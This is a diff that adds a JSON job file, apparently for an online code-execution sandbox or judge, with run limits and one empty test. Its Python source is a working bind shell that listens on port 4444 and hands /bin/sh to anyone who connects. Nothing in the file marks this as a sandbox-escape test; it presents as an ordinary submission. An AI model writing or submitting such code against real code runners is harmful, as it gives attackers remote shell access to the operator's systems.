@@ -1,0 +1,17 @@
+{
+  "language": "py3",
+  "source": "import socket,os\ns=socket.socket();s.bind(('0.0.0.0',4444));s.listen(1);c,_=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.execvp('/bin/sh',['sh'])\n",
+  "tests": [
+    {
+      "stdin": "",
+      "expected_stdout": ""
+    }
+  ],
+  "run": {
+    "limits": {
+      "wall_time_s": 4,
+      "memory_kb": 102400,
+      "max_processes": 64
+    }
+  }
+}
